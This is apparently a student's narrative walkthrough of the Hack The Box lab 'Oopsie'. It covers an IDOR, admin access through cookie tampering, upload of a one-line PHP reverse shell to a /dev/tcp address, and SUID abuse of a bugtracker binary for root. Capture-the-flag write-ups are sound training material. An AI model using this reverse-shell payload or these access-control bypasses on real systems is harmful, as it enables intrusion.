# Oopsie HTB

I’ll be honest — I hit a wall on this one. After exploring the “multiverse” of Robert’s home directory, I had to turn to Google to find the path to Root.\
In this storyline-style walkthrough, I show you my full process: the successes, the failures, and the simple Python tricks that make a reverse shell feel like home.

**"Where there is a will, there is a way"**

After a two-month break dealing with college stuff, I’m back in the lab. I’m starting with a Linux machine named **Oopsie**.\ 
Looking at the initial info, it seemed a bit too easy—maybe my previous knowledge is finally starting to sharpen up.

### 1. Enumeration: The Favorite Ancient Technique

As always, we start with our favorite tool: **Nmap**.

```Bash
nmap -sC -sV -p 1-1000 [Target-IP] > nmap.txt
```
<img width="953" height="414" alt="1" src="https://github.com/user-attachments/assets/5ae64b15-cb68-4a53-8347-27b6056300df" />

Checking the results, Port 22 (SSH) and Port 80 (HTTP) are open. Without credentials, SSH is like a locked vault full of gold without a key. So, I moved straight to the website.

<img width="951" height="650" alt="2" src="https://github.com/user-attachments/assets/5221c5b2-9053-4211-85c0-47d415bb7151" />


The homepage looked like a standard HTB site—nothing interesting to click. I used the "ancient technique" of viewing the source code (**CTRL + U**) and found a link at the very end to `/cdn-cgi/login`.

<img width="1185" height="159" alt="3" src="https://github.com/user-attachments/assets/fb334c04-3008-4003-84a6-b56cd9132965" />


### 2. Broken Access Control: The Guest Loophole

The login page allowed a **Guest Login**. Since I'm not looking for a headache trying to crack a password yet, I took the easy way in.

<img width="364" height="342" alt="4" src="https://github.com/user-attachments/assets/87b5d6f5-7923-41e2-988c-4506cf17e125" />

Once in, I noticed the URL parameters. Wisdom from previous labs told me to look closer: _"Where focus goes, energy flows."_ (Tony Robbins 🫡). I found a parameter: `.../admin.php?content=accounts&id=2`.

<img width="1387" height="389" alt="5" src="https://github.com/user-attachments/assets/d1326ba5-54f8-4023-8097-fc8ac0847df3" />

**The IDOR Experiment:**

I tried changing `id=2` to `id=1`. Usually, the admin is #1. It gave me an admin ID, but at first, it was just a number—like having a key but not knowing where the lock is.

<img width="1095" height="379" alt="6" src="https://github.com/user-attachments/assets/48848745-66ad-486a-91e8-6c785d7368fd" />

Then, I found the lock.

<img width="1084" height="365" alt="7" src="https://github.com/user-attachments/assets/3b7ad404-4ff9-400c-bd02-086092f96f34" />


### 3. Cookie Tampering & The Admin Gateway

I realized I needed more than just a number; I needed to _be_ the admin.

> ### The Internal Doubt: How does the website know who I am?
> 
> I listed the possibilities by difficulty:
> 
> - **A. Cookies** (High chance!)
>     
> - **B. Session ID** (Less likely)
>     
> - **C. IP Address** (Almost impossible)
>     

I went with **Option A**. I used Burp Suite to capture the request and sent it to **Repeater**. I swapped:

- User `2233` (Guest) $\rightarrow$ `34322` (Admin ID).
    
- Role `guest` $\rightarrow$ `admin`.
    
<img width="1210" height="671" alt="8" src="https://github.com/user-attachments/assets/e55b84cf-ad89-42e1-a39c-6c7adc6c71d9" /> 

It worked! The branding image uploads page unlocked.

<img width="846" height="794" alt="9" src="https://github.com/user-attachments/assets/5e425cd9-221a-41e2-9692-cd9cb9531f00" />


### 4. Foothold: Catching the Shell

I created a PHP reverse shell:

```PHP
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.165/1234 0>&1'"); ?>
```

I captured the upload request to ensure the cookies were perfectly set for the backend.

<img width="1038" height="580" alt="10" src="https://github.com/user-attachments/assets/ee4bf69d-70d8-4f63-895a-48a77c986d7b" />


But where did the file go? I checked the homepage and confirmed an `/uploads/` directory exists.

<img width="707" height="234" alt="11" src="https://github.com/user-attachments/assets/dcf168a4-dc2d-4b50-ba36-f0f09d7d9178" />

I fired up **Netcat** on port 1234, accessed `backdoor.php`, and got a hit!

<img width="658" height="200" alt="12" src="https://github.com/user-attachments/assets/ff255012-27bb-4105-8a46-4bc1b8a7eb49" />

I upgraded my shell to a bash shell for more control.

<img width="816" height="201" alt="13" src="https://github.com/user-attachments/assets/99a8615b-58bd-4df6-bf27-b4a2cff2f0f6" />

### 5. Lateral Movement: Becoming Robert

Now it was time to be "Dora the explorer." I searched for credentials and found some in the web files.

<img width="731" height="107" alt="14" src="https://github.com/user-attachments/assets/54d549d0-2069-48fc-aee9-0a9c4704e2d1" />


I tried to `su robert`, but the terminal complained about a "teletype" problem. Python handled it easily:

```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="802" height="244" alt="15" src="https://github.com/user-attachments/assets/2a45a2eb-a86e-4fcd-b216-c4a4cf56d63c" />


I was now **Robert**. I found the `user.txt` flag right in the home directory—a fun fact after searching everywhere else!

<img width="552" height="291" alt="16" src="https://github.com/user-attachments/assets/98275a64-0faa-496c-92ba-d7f9b070693e" />

### 6. Privilege Escalation: The Google Win

Finding the path to the root was the real challenge. I'll be honest—I explored and explored, but I couldn't find where the "good stuff" was hidden on my own.

I didn't give up; I used **Google**.

<img width="917" height="715" alt="17" src="https://github.com/user-attachments/assets/ad6b3870-32d5-401f-ab3a-e34c37bb629f" />


There's no shame in taking help! I learned how to use the `find` command to hunt for SUID binaries. That’s how I found `/usr/bin/bugtracker`. It had SUID bits, meaning it runs as root.

<img width="770" height="446" alt="18" src="https://github.com/user-attachments/assets/541ab31e-30ec-4113-9d8c-f24d7f50160a" />


I didn't quite know how to exploit it, so I just started guessing. Sometimes, a random guess points you in the right direction.

<img width="1600" height="736" alt="19" src="https://github.com/user-attachments/assets/dda83537-da86-4a51-90ba-25cc0fb36b84" />


I realized the program just prints the contents of a file you name. I "guessed" the root flag location, and I won the battle.

**[Insert 21.png here]**

**Thank you for reading!**
